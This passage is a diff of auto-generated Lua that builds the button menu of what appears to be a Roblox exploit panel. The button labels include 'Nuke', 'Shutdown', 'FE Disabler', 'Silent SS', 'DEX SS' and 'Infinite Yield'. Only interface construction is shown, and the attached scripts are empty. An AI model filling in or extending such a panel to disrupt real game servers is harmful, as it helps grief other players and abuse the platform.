 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["59"] = Instance.new("LocalScript", G2L["56"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["5b"] = Instance.new("UIStroke", G2L["59"]);
-G2L["5b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["5c"] = Instance.new("LocalScript", G2L["59"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["5a"] = Instance.new("TextButton", G2L["37"]);
+G2L["5a"]["TextWrapped"] = true;
+G2L["5a"]["BorderSizePixel"] = 0;
+G2L["5a"]["TextSize"] = 14;
+G2L["5a"]["TextScaled"] = true;
+G2L["5a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5a"]["BackgroundTransparency"] = 1;
+G2L["5a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5a"]["Text"] = [[c00lkidd music]];
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["5b"] = Instance.new("UIStroke", G2L["5a"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["5d"] = Instance.new("LocalScript", G2L["59"]);
-G2L["5d"]["Name"] = [[Notify]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["5e"] = Instance.new("LocalScript", G2L["59"]);
-G2L["5e"]["Name"] = [[Warner]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["5c"] = Instance.new("UIStroke", G2L["5a"]);
+G2L["5c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["5f"] = Instance.new("TextButton", G2L["3e"]);
-G2L["5f"]["TextWrapped"] = true;
-G2L["5f"]["BorderSizePixel"] = 0;
-G2L["5f"]["TextSize"] = 14;
-G2L["5f"]["TextScaled"] = true;
-G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["5f"]["BackgroundTransparency"] = 1;
-G2L["5f"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["5f"]["Text"] = [[c00lkidd Music]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["5d"] = Instance.new("LocalScript", G2L["5a"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["60"] = Instance.new("UIStroke", G2L["5f"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["5e"] = Instance.new("TextButton", G2L["37"]);
+G2L["5e"]["TextWrapped"] = true;
+G2L["5e"]["BorderSizePixel"] = 0;
+G2L["5e"]["TextSize"] = 14;
+G2L["5e"]["TextScaled"] = true;
+G2L["5e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5e"]["BackgroundTransparency"] = 1;
+G2L["5e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5e"]["Text"] = [[Inf Yield]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["61"] = Instance.new("UIStroke", G2L["5f"]);
-G2L["61"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["5f"] = Instance.new("UIStroke", G2L["5e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["62"] = Instance.new("LocalScript", G2L["5f"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["60"] = Instance.new("UIStroke", G2L["5e"]);
+G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["63"] = Instance.new("LocalScript", G2L["5f"]);
-G2L["63"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["61"] = Instance.new("LocalScript", G2L["5e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["64"] = Instance.new("LocalScript", G2L["5f"]);
-G2L["64"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["62"] = Instance.new("TextButton", G2L["37"]);
+G2L["62"]["TextWrapped"] = true;
+G2L["62"]["BorderSizePixel"] = 0;
+G2L["62"]["TextSize"] = 14;
+G2L["62"]["TextScaled"] = true;
+G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["62"]["BackgroundTransparency"] = 1;
+G2L["62"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["62"]["Text"] = [[Silent SS]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["65"] = Instance.new("TextButton", G2L["3e"]);
-G2L["65"]["TextWrapped"] = true;
-G2L["65"]["BorderSizePixel"] = 0;
-G2L["65"]["TextSize"] = 14;
-G2L["65"]["TextScaled"] = true;
-G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["65"]["BackgroundTransparency"] = 1;
-G2L["65"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["65"]["Text"] = [[KJ]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["63"] = Instance.new("UIStroke", G2L["62"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["66"] = Instance.new("UIStroke", G2L["65"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["64"] = Instance.new("UIStroke", G2L["62"]);
+G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["67"] = Instance.new("UIStroke", G2L["65"]);
-G2L["67"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["65"] = Instance.new("LocalScript", G2L["62"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["68"] = Instance.new("LocalScript", G2L["65"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["66"] = Instance.new("TextButton", G2L["37"]);
+G2L["66"]["TextWrapped"] = true;
+G2L["66"]["BorderSizePixel"] = 0;
+G2L["66"]["TextSize"] = 14;
+G2L["66"]["TextScaled"] = true;
+G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["66"]["BackgroundTransparency"] = 1;
+G2L["66"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["66"]["Text"] = [[l0stAdmin]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["69"] = Instance.new("LocalScript", G2L["65"]);
-G2L["69"]["Name"] = [[Notify]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["67"] = Instance.new("UIStroke", G2L["66"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["6a"] = Instance.new("LocalScript", G2L["65"]);
-G2L["6a"]["Name"] = [[Warner]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["6b"] = Instance.new("TextButton", G2L["3e"]);
-G2L["6b"]["TextWrapped"] = true;
-G2L["6b"]["BorderSizePixel"] = 0;
-G2L["6b"]["TextSize"] = 14;
-G2L["6b"]["TextScaled"] = true;
-G2L["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["6b"]["BackgroundTransparency"] = 1;
-G2L["6b"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["6b"]["Text"] = [[Nuke]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["68"] = Instance.new("UIStroke", G2L["66"]);
+G2L["68"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["6c"] = Instance.new("UIStroke", G2L["6b"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["69"] = Instance.new("LocalScript", G2L["66"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["6d"] = Instance.new("UIStroke", G2L["6b"]);
-G2L["6d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["6a"] = Instance.new("TextButton", G2L["37"]);
+G2L["6a"]["TextWrapped"] = true;
+G2L["6a"]["BorderSizePixel"] = 0;
+G2L["6a"]["TextSize"] = 14;
+G2L["6a"]["TextScaled"] = true;
+G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6a"]["BackgroundTransparency"] = 1;
+G2L["6a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6a"]["Text"] = [[AntiSkid]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["6e"] = Instance.new("LocalScript", G2L["6b"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["6b"] = Instance.new("UIStroke", G2L["6a"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["6f"] = Instance.new("LocalScript", G2L["6b"]);
-G2L["6f"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
+G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["70"] = Instance.new("LocalScript", G2L["6b"]);
-G2L["70"]["Name"] = [[Warner]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["6d"] = Instance.new("LocalScript", G2L["6a"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["71"] = Instance.new("TextButton", G2L["3e"]);
-G2L["71"]["TextWrapped"] = true;
-G2L["71"]["BorderSizePixel"] = 0;
-G2L["71"]["TextSize"] = 14;
-G2L["71"]["TextScaled"] = true;
-G2L["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["71"]["BackgroundTransparency"] = 1;
-G2L["71"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["71"]["Text"] = [[RC7]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["6e"] = Instance.new("TextButton", G2L["37"]);
+G2L["6e"]["TextWrapped"] = true;
+G2L["6e"]["BorderSizePixel"] = 0;
+G2L["6e"]["TextSize"] = 14;
+G2L["6e"]["TextScaled"] = true;
+G2L["6e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6e"]["BackgroundTransparency"] = 1;
+G2L["6e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6e"]["Text"] = [[Destroy All Sounds]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["72"] = Instance.new("UIStroke", G2L["71"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["6f"] = Instance.new("UIStroke", G2L["6e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["73"] = Instance.new("UIStroke", G2L["71"]);
-G2L["73"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["70"] = Instance.new("UIStroke", G2L["6e"]);
+G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["74"] = Instance.new("LocalScript", G2L["71"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["71"] = Instance.new("LocalScript", G2L["6e"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["75"] = Instance.new("LocalScript", G2L["71"]);
-G2L["75"]["Name"] = [[Notify]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["72"] = Instance.new("TextButton", G2L["37"]);
+G2L["72"]["TextWrapped"] = true;
+G2L["72"]["BorderSizePixel"] = 0;
+G2L["72"]["TextSize"] = 14;
+G2L["72"]["TextScaled"] = true;
+G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["72"]["BackgroundTransparency"] = 1;
+G2L["72"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["72"]["Text"] = [[Shutdown]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["76"] = Instance.new("LocalScript", G2L["71"]);
-G2L["76"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["73"] = Instance.new("UIStroke", G2L["72"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["77"] = Instance.new("TextButton", G2L["3e"]);
-G2L["77"]["TextWrapped"] = true;
-G2L["77"]["BorderSizePixel"] = 0;
-G2L["77"]["TextSize"] = 14;
-G2L["77"]["TextScaled"] = true;
-G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["77"]["BackgroundTransparency"] = 1;
-G2L["77"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["77"]["Text"] = [[HappyHub]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["78"] = Instance.new("UIStroke", G2L["77"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["74"] = Instance.new("UIStroke", G2L["72"]);
+G2L["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["75"] = Instance.new("LocalScript", G2L["72"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["79"] = Instance.new("UIStroke", G2L["77"]);
-G2L["79"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["7a"] = Instance.new("LocalScript", G2L["77"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["76"] = Instance.new("TextButton", G2L["37"]);
+G2L["76"]["TextWrapped"] = true;
+G2L["76"]["BorderSizePixel"] = 0;
+G2L["76"]["TextSize"] = 14;
+G2L["76"]["TextScaled"] = true;
+G2L["76"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["76"]["BackgroundTransparency"] = 1;
+G2L["76"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["76"]["Text"] = [[FE Disabler]];
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["77"] = Instance.new("UIStroke", G2L["76"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["7b"] = Instance.new("LocalScript", G2L["77"]);
-G2L["7b"]["Name"] = [[Notify]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["7c"] = Instance.new("LocalScript", G2L["77"]);
-G2L["7c"]["Name"] = [[Warner]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["78"] = Instance.new("UIStroke", G2L["76"]);
+G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["7d"] = Instance.new("TextButton", G2L["3e"]);
-G2L["7d"]["TextWrapped"] = true;
-G2L["7d"]["BorderSizePixel"] = 0;
-G2L["7d"]["TextSize"] = 14;
-G2L["7d"]["TextScaled"] = true;
-G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["7d"]["BackgroundTransparency"] = 1;
-G2L["7d"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["7d"]["Text"] = [[Infinite Yield]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["79"] = Instance.new("LocalScript", G2L["76"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["7e"] = Instance.new("UIStroke", G2L["7d"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["7a"] = Instance.new("TextButton", G2L["37"]);
+G2L["7a"]["TextWrapped"] = true;
+G2L["7a"]["BorderSizePixel"] = 0;
+G2L["7a"]["TextSize"] = 14;
+G2L["7a"]["TextScaled"] = true;
+G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7a"]["BackgroundTransparency"] = 1;
+G2L["7a"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7a"]["Text"] = [[Gojo]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["7f"] = Instance.new("UIStroke", G2L["7d"]);
-G2L["7f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["7b"] = Instance.new("UIStroke", G2L["7a"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["80"] = Instance.new("LocalScript", G2L["7d"]);
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["7c"] = Instance.new("UIStroke", G2L["7a"]);
+G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["81"] = Instance.new("LocalScript", G2L["7d"]);
-G2L["81"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["7d"] = Instance.new("LocalScript", G2L["7a"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["82"] = Instance.new("LocalScript", G2L["7d"]);
-G2L["82"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["7e"] = Instance.new("TextButton", G2L["37"]);
+G2L["7e"]["TextWrapped"] = true;
+G2L["7e"]["BorderSizePixel"] = 0;
+G2L["7e"]["TextSize"] = 14;
+G2L["7e"]["TextScaled"] = true;
+G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7e"]["BackgroundTransparency"] = 1;
+G2L["7e"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["7e"]["Text"] = [[Guns]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["83"] = Instance.new("TextButton", G2L["3e"]);
-G2L["83"]["TextWrapped"] = true;
-G2L["83"]["BorderSizePixel"] = 0;
-G2L["83"]["TextSize"] = 14;
-G2L["83"]["TextScaled"] = true;
-G2L["83"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["83"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["83"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["83"]["BackgroundTransparency"] = 1;
-G2L["83"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["83"]["Text"] = [[k00pGUI]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["7f"] = Instance.new("UIStroke", G2L["7e"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["84"] = Instance.new("UIStroke", G2L["83"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["80"] = Instance.new("UIStroke", G2L["7e"]);
+G2L["80"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["85"] = Instance.new("UIStroke", G2L["83"]);
-G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["81"] = Instance.new("LocalScript", G2L["7e"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["86"] = Instance.new("LocalScript", G2L["83"]);
 
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["82"] = Instance.new("TextButton", G2L["37"]);
+G2L["82"]["TextWrapped"] = true;
+G2L["82"]["BorderSizePixel"] = 0;
+G2L["82"]["TextSize"] = 14;
+G2L["82"]["TextScaled"] = true;
+G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["82"]["BackgroundTransparency"] = 1;
+G2L["82"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["82"]["Text"] = [[Screamer]];
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["87"] = Instance.new("LocalScript", G2L["83"]);
-G2L["87"]["Name"] = [[Notify]];
 
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["83"] = Instance.new("UIStroke", G2L["82"]);
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["88"] = Instance.new("LocalScript", G2L["83"]);
-G2L["88"]["Name"] = [[Warner]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton
-G2L["89"] = Instance.new("TextButton", G2L["3e"]);
-G2L["89"]["TextWrapped"] = true;
-G2L["89"]["BorderSizePixel"] = 0;
-G2L["89"]["TextSize"] = 14;
-G2L["89"]["TextScaled"] = true;
-G2L["89"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["89"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["89"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["89"]["BackgroundTransparency"] = 1;
-G2L["89"]["Size"] = UDim2.new(0, 375, 0, 29);
-G2L["89"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["89"]["Text"] = [[DEX SS]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["84"] = Instance.new("UIStroke", G2L["82"]);
+G2L["84"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["8a"] = Instance.new("UIStroke", G2L["89"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["85"] = Instance.new("LocalScript", G2L["82"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.UIStroke
-G2L["8b"] = Instance.new("UIStroke", G2L["89"]);
-G2L["8b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
+G2L["86"] = Instance.new("TextButton", G2L["37"]);
+G2L["86"]["TextWrapped"] = true;
